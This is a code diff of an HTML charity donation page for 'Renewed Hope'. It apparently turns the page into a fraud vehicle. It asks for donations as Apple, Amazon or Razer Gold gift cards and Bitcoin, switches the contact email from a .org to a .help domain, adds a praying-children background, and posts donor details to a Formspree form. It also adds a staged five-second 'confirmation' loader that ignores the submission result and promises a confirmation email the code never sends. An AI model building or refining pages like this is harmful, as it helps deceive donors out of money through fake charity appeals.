@@ -22,12 +22,48 @@
 
     body {
       min-height: 100vh;
-      background: linear-gradient(135deg, var(--rose-50) 0%, var(--rose-100) 100%);
+      background: url('images/praying-children.jpg') no-repeat center center fixed;
+      background-size: cover;
       font-family: 'Segoe UI', Arial, sans-serif;
       color: var(--gray-900);
       margin: 0;
       display: flex;
       flex-direction: column;
+    }
+
+    .bg-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      background: rgba(255,255,255,0.12);
+      pointer-events: none;
+    }
+
+    /* Go Back Button Styles */
+    .go-back-btn {
+      position: fixed;
+      top: 22px;
+      left: 20px;
+      z-index: 10001;
+      background: var(--rose-600);
+      color: #fff;
+      text-decoration: none;
+      font-size: 1.05rem;
+      padding: 8px 18px 8px 14px;
+      border-radius: 24px;
+      box-shadow: 0 2px 12px #be123c1b;
+      font-weight: 500;
+      transition: background 0.18s, color 0.18s, box-shadow 0.18s;
+      display: inline-block;
+      letter-spacing: 0.02em;
+    }
+    .go-back-btn:hover {
+      background: var(--rose-700);
+      color: #fff;
+      box-shadow: 0 4px 20px #be123c33;
+    }
+    @media (max-width:540px){
+      .go-back-btn { top: 8px; left: 5px; font-size: 0.97rem; padding: 7px 14px 7px 11px;}
     }
 
     header {
@@ -69,6 +105,7 @@
       align-items: center;
       justify-content: center;
       padding: 2rem 0;
+      z-index: 1;
     }
     .donate-card {
       width: 100%;
@@ -81,6 +118,8 @@
       display: flex;
       flex-direction: column;
       align-items: stretch;
+      position: relative;
+      z-index: 1;
     }
     .donate-card h1 {
       text-align: center;
@@ -195,11 +234,49 @@
     }
     .hidden { display: none; }
 
+    /* Loader styles */
+    #confirmationLoader {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 10000;
+      background: rgba(255,255,255,0.97);
+      color: #be123c;
+      font-size: 1.35rem;
+      font-weight: 500;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+    }
+    #confirmationLoader .loader-text {
+      margin-bottom: 1.6rem;
+      font-size: 1.33rem;
+      font-weight: 600;
+      color: #be123c;
+      letter-spacing: 0.02em;
+    }
+    .spin-circle {
+      margin: 0 auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #be123c;
+      border-radius: 50%;
+      width: 36px;
+      height: 36px;
+      animation: spin 1.2s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
     footer {
       background: var(--gray-900);
       color: var(--white);
       padding: 3rem 0 1rem 0;
       margin-top: 3rem;
+      z-index: 1;
+      position: relative;
     }
     .footer-grid {
       display: grid;
@@ -280,6 +357,17 @@
   </style>
 </head>
 <body>
+  <!-- Go Back Button -->
+  <a href="javascript:window.history.back()" class="go-back-btn" title="Go Back">
+    &#8592; Go Back
+  </a>
+  <!-- Overlay for readability -->
+  <div class="bg-overlay"></div>
+  <!-- Confirmation Loader -->
+  <div id="confirmationLoader">
+    <div class="loader-text">Kindly hold for confirmation</div>
+    <div class="spin-circle"></div>
+  </div>
   <!-- Header -->
   <header>
     <div class="container header-inner">
@@ -294,7 +382,7 @@
 
   <!-- Main donation form -->
   <main>
-    <div class="donate-card">
+    <div class="donate-card" id="mainDonateCard">
       <h1>Support Our Mission</h1>
       <p>Your donation makes a difference. Join us in making a positive impact!</p>
       <form id="donationForm">
@@ -309,7 +397,7 @@
         <textarea id="message" name="message" rows="3" placeholder="Leave a message..."></textarea>
         
         <label for="paymentSelect">Choose Payment Method</label>
-        <select id="paymentSelect" onchange="showPayment(this.value)" required>
+        <select id="paymentSelect" name="paymentSelect" onchange="showPayment(this.value)" required>
           <option value="">-- Select a Payment Option --</option>
           <option value="giftcard">Gift Card</option>
           <option value="btc">Bitcoin (BTC)</option>
@@ -320,7 +408,7 @@
         <div id="giftcard" class="payment-info-box">
           <strong>Gift Cards:</strong><br>
           Apple, Amazon, Razer Gold<br>
-          Send to: info@renewedhope.org
+          Send to: info@renewedhope.help
         </div>
 
         <div id="btc" class="payment-info-box">
@@ -346,6 +434,9 @@
       <div id="thankYouMsg" class="hidden">
         <h2 style="color:var(--rose-700);">Thank You! 💖</h2>
         <p>Your generosity means so much to us.</p>
+        <p style="color:#be123c;font-size:1.07rem;">
+          We deeply appreciate your support. Look out for a confirmation email in your inbox once your donation is processed.
+        </p>
       </div>
     </div>
   </main>
@@ -374,7 +465,7 @@
           <div class="footer-section-title">Contact</div>
           <div class="footer-contact">123 Hope Street</div>
           <div class="footer-contact">Charity City, CH 12345</div>
-          <div class="footer-contact">info@renewedhope.org</div>
+          <div class="footer-contact">info@renewedhope.help</div>
           <div class="footer-contact">(904) 609-8642</div>
         </div>
         <div>
@@ -405,17 +496,38 @@
       alert("Copied: " + text);
     }
 
-    // Form thank you
-    document.getElementById('donationForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      document.getElementById('donationForm').classList.add('hidden');
-      document.getElementById('thankYouMsg').classList.remove('hidden');
-    });
-
     // Hide payment boxes by default on load
     window.onload = function() {
       showPayment('');
     }
+
+    // Handle form submission for AJAX and custom flow
+    document.getElementById('donationForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // Hide donation card content, show loader
+      document.getElementById('mainDonateCard').style.visibility = 'hidden';
+      document.getElementById('confirmationLoader').style.display = 'flex';
+
+      // Gather form data
+      const form = e.target;
+      const formData = new FormData(form);
+
+      // AJAX POST to Formspree
+      fetch('https://formspree.io/f/xpwlqldl', {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      });
+
+      // Wait 5 seconds, then hide loader and show thank you message
+      setTimeout(function() {
+        document.getElementById('confirmationLoader').style.display = 'none';
+        document.getElementById('mainDonateCard').style.visibility = 'visible';
+        form.classList.add('hidden');
+        document.getElementById('thankYouMsg').classList.remove('hidden');
+      }, 5000);
+    });
   </script>
 </body>
 </html>
